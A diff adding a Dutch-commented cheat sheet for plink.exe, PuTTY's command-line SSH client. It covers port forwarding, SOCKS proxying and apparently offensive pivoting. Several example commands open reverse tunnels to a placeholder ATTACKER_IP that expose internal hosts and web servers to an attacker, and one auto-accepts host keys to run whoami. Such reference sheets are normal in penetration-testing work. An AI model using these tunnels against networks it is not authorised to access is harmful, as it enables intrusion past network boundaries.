@@ -1,0 +1,54 @@
+# Plink — PuTTY SSH client/tunnel (commandline)
+# Commandline SSH client voor Windows met tunnel (port forwarding) mogelijkheden
+#
+# === Syntax ===
+# plink.exe -ssh USER@TARGET -pw PASS [opties]
+#
+# === Tunnel opties ===
+# -L LOCAL:HOST:REMOTE    Local port forward (lokale poort -> remote)
+# -R REMOTE:HOST:LOCAL    Remote port forward (remote poort -> lokaal)
+# -D PORT                 Dynamic port forward (SOCKS proxy)
+#
+# === Belangrijkste opties ===
+# -ssh           SSH protocol (default)
+# -pw PASS       Wachtwoord
+# -P PORT        SSH poort (default 22)
+# -N             Geen shell openen (alleen tunnel)
+# -C             Compressie inschakelen
+# -batch         Non-interactief (geen prompts)
+# -i KEY.ppk     Private key bestand (PuTTY formaat)
+# -v             Verbose output
+# -x             X11 forwarding uitschakelen
+#
+# === Voorbeelden ===
+
+# === SSH verbinding ===
+plink.exe -ssh USER@TARGET -pw PASS
+
+# === Local port forward ===
+# Toegang tot remote service via lokale poort
+plink.exe -ssh USER@TARGET -pw PASS -L 8080:127.0.0.1:80 -N
+
+# RDP via SSH tunnel
+plink.exe -ssh USER@TARGET -pw PASS -L 3389:INTERNAL_HOST:3389 -N
+# Verbind dan met: mstsc /v:127.0.0.1:3389
+
+# === Remote port forward (reverse tunnel) ===
+# Remote machine kan nu attacker poort 9090 bereiken
+plink.exe -ssh USER@ATTACKER_IP -pw PASS -R 9090:127.0.0.1:9090 -N
+
+# Expose interne webserver naar attacker
+plink.exe -ssh USER@ATTACKER_IP -pw PASS -R 8080:INTERNAL_HOST:80 -N
+
+# === SOCKS proxy ===
+plink.exe -ssh USER@TARGET -pw PASS -D 1080 -N
+# Configureer proxychains: socks5 127.0.0.1 1080
+
+# === Met SSH key ===
+plink.exe -ssh USER@TARGET -i key.ppk -N -D 1080
+
+# === Auto-accept host key (scripting) ===
+echo y | plink.exe -ssh USER@TARGET -pw PASS -batch cmd /c whoami
+
+# Noot: -batch voorkomt interactieve prompts (handig voor scripts)
+# Noot: Gebruik puttygen.exe om OpenSSH keys te converteren naar .ppk
